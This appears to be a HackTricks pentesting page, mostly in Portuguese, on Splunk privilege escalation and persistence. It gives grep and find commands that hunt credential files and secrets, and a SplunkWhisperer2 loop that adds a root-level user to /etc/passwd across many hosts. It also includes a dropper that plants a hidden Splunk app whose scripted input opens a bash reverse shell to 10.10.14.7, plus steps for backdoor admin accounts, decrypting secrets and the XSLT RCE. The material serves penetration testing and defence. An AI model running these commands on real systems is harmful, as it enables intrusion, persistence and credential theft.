# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Se ao **enumerar** uma máquina **internamente** ou **externamente** você encontrar o **Splunk em execução** (normalmente **8000** para a web UI e **8089** para a management API), credenciais válidas muitas vezes podem ser convertidas em **execução de código** por meio de instalação de app, scripted inputs ou ações de gerenciamento. Se o Splunk estiver sendo executado como **root**, isso frequentemente se torna uma **escalada de privilégio** imediata.

Se você só precisar da superfície de ataque remota genérica, enumeração ou do caminho de RCE por upload de app, verifique:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se você já for **root** e o serviço Splunk não estiver escutando apenas em localhost, você também pode roubar **Splunk password hashes**, recuperar **encrypted secrets** ou enviar um **malicious app** para manter persistência localmente ou em múltiplos forwarders.

## Interesting Local Files

When you land on a host running Splunk or Splunk Universal Forwarder, these are usually the most interesting paths:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefatos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuários locais do Splunk e hashes de senha.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chave usada pelo Splunk para criptografar segredos armazenados em vários arquivos `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: arquivo inicial de bootstrap do admin; útil em gold images e erros de provisionamento. É ignorado se `etc/passwd` já existir.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: onde scripted inputs são normalmente habilitados.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`**: bons locais para esconder um app persistente ou revisar o que já está sendo distribuído.

## Resumo da exploração do agente Splunk Universal Forwarder

Para mais detalhes, ver [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Isto é apenas um resumo:

**Visão geral do exploit:**
Um exploit que mira o Splunk Universal Forwarder (UF) permite que atacantes com a **senha do agent** executem código arbitrário em sistemas que rodam o agent, comprometendo potencialmente uma grande parte do ambiente.

**Por que funciona:**

- O serviço de gerenciamento do UF normalmente fica exposto em **TCP 8089**.
- Atacantes podem se autenticar na API e instruir o forwarder a instalar um **malicious app bundle**.
- O mesmo primitive pode ser usado localmente para **LPE** ou remotamente para **RCE**.
- Ferramentas públicas como **SplunkWhisperer2** criam o app bundle automaticamente e podem adaptar payloads para alvos Linux.

**Formas comuns de recuperar a senha:**

- Credenciais em texto claro em documentação, scripts, shares ou automação de deployment.
- Hashes de senha dentro de `$SPLUNK_HOME/etc/passwd` seguidos de cracking offline.
- Gold images ou restos de provisionamento como `user-seed.conf`.

**Impacto:**

- Execução de código em nível de SYSTEM/root em cada host comprometido.
- Implantação de apps persistentes, backdoors ou ransomware.
- Desativação ou adulteração de telemetry antes que os dados sejam encaminhados.

**Exemplo de comando para exploração:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploit públicos utilizáveis:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistência via Scripted Inputs ou Apps Maliciosos

Se você tiver **filesystem write access** como `root`/`splunk`, ou acesso autenticado para instalar apps, um mecanismo de persistência muito confiável é soltar uma **custom app** com um **scripted input**. A própria documentação do Splunk espera que scripted inputs vivam dentro de um diretório de app e sejam habilitados a partir de `inputs.conf`.

Layout típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper Linux rápido:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- O mesmo truque funciona no **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Atacantes frequentemente se misturam ao modificar um add-on legítimo em vez de criar um app obviamente malicioso.
- Em um **deployment server**, plantar um app malicioso dentro de `deployment-apps/` se transforma em **persistence em toda a frota** porque os forwarders fazem polling, baixam apps atualizados e muitas vezes reiniciam para aplicá-los.

## Credential Theft and Admin Takeover

Se você consegue ler os arquivos locais do Splunk, geralmente há dois bons objetivos: recuperar acesso de **admin do Splunk** e recuperar **encrypted service credentials**.

### Password hashes and local users

O Splunk armazena os dados de autenticação local em `etc/passwd`. Dependendo do deployment, quebrar esse arquivo pode recuperar credenciais funcionais para a interface web e a management API.

Se você já tem credenciais válidas de **admin** e o Splunk usa seu backend de autenticação **native**, o próprio CLI pode ser usado para persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` and encrypted values

O Splunk usa `etc/auth/splunk.secret` para proteger valores sensíveis armazenados em vários arquivos de configuração. Se você conseguir roubar tanto o **secret** quanto os arquivos **`.conf`** relevantes, muitas vezes pode recuperar ou reutilizar:

- shared secrets de forwarder/indexer, como `pass4SymmKey`
- senhas de private-key TLS, como `sslPassword`
- credenciais de bind do LDAP, como `bindDNPassword`

Isso é útil para **lateral movement** mesmo quando a senha de admin do Splunk em si não é quebrável.

### `user-seed.conf` abuse

`user-seed.conf` só é consumido na primeira inicialização ou quando `etc/passwd` não existe. Isso o torna menos útil em uma máquina ativa, mas muito interessante em:

- templates de instalação comprometidos
- container images
- fluxos de provisionamento unattended
- appliances onde o Splunk é reinicializado automaticamente

Nesses casos, plantar um `HASHED_PASSWORD` gerado com `splunk hash-passwd` dá a você uma forma discreta de recuperar acesso de admin após o redeployment.

## Abusing Splunk Queries

Para mais detalhes, veja [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Uma técnica recente útil é abusar de **user-supplied XSLT** em versões vulneráveis do Splunk Enterprise para transformar uma conta autenticada com baixo privilégio em **OS command execution** como o usuário `splunk`.

Fluxo de alto nível:

1. Autentique-se no Splunk.
2. Faça upload de um arquivo **XSL** malicioso por meio da funcionalidade de preview/upload.
3. Faça o Splunk renderizar os resultados de busca com essa stylesheet enviada, a partir do diretório **dispatch**.
4. Use o payload XSLT para escrever um arquivo ou acionar execução através do pipeline de busca do Splunk (por exemplo, alcançando funcionalidades internas como `runshellscript`).

O ponto ofensivo importante é que esse caminho é **post-auth RCE sem precisar de app upload**. No Linux, normalmente ele coloca você na conta **`splunk`**, o que ainda é valioso porque esse usuário muitas vezes é dono da árvore da aplicação, consegue ler secrets e pode plantar apps persistentes que sobrevivem à perda de shell.

Um caminho representativo usado durante a exploração é:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se o Splunk estiver sendo executado com privilégios demais, ou se o usuário `splunk` tiver acesso a scripts perigosos, service units graváveis, ou regras `sudo` ruins, isso se torna uma cadeia limpa de **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
